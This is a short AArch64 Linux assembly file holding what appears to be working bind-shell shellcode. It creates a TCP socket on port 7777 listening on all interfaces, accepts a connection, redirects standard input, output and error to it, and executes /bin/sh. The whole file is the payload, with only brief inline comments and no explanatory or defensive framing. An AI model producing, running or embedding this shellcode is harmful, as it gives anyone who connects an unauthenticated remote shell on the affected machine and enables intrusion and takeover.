.text
.global _start

_start:
	mov x0, #2		// AF_INET
	mov x1, #1		// SOCK_STREAM
	mov x2,	#0		// TCP
	mov x8, #198		// syscall socket()
	svc 0

	mov x4, x0		// save server socket fd

	mov x0, x4		// socket fd
	adr x1, _sa		// sa struct
	mov x2, #16		// sizeof(sa struct)
	mov x8, #200		// syscall bind()
	svc 0

	mov x0, x4		// socket fd
	mov x1, #0		// backlog 0
	mov x8, #201		// syscall listen()
	svc 0

	mov x0, x4		// socket fd
	mov x1, #0		// NULL addr
	mov x2, #0		// addrlen zero
	mov x8, #202		// syscall accept
	svc 0

	mov x4, x0		// save client socket fd

	mov x0, x4		// socket fd
	mov x1, #0		// stdin
	mov x2, #0		// no flags
	mov x8, #24		// syscall dup3()
	svc 0

	mov x0, x4		// socket fd
	mov x1, #1		// stdout
	mov x2, #0		// no flags
	mov x8, #24		// syscall dup3()
	svc 0

	mov x0, x4		// socket fd
	mov x1, #2		// stderr
	mov x2, #0		// no flags
	mov x8, #24		// syscall dup3()
	svc 0

	adr x0, _shell		// the command
	mov x1, #0		// argv
	mov x2, #0		// env
	mov x8, #221		// syscall execve()
	svc 0

_sa:
.dword 0x00000000611e0002	// AF_INET, port 7777, INADDR_ANY 
.dword 0x0000000000000000

_shell:
.asciz "/bin/sh"		// NULL terminated
